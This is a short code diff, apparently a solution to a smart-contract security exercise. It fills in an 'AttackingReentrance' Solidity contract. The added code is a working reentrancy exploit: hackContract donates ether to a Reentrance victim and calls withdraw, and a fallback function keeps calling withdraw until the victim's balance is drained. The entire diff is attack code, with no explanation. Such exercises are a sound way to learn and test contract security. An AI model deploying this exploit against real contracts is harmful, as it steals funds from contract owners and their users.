@@ -10,6 +10,15 @@ contract AttackingReentrance {
     }
 
     function hackContract() external {
-        // Code me!
+        Reentrance victimContract = Reentrance(contractAddress);
+        victimContract.donate{value: address(this).balance}(address(this));
+        victimContract.withdraw();
+    }
+
+    fallback() external payable {
+        Reentrance victimContract = Reentrance(contractAddress);
+        if(contractAddress.balance > 0) {
+        victimContract.withdraw();
+        }
     }
 }
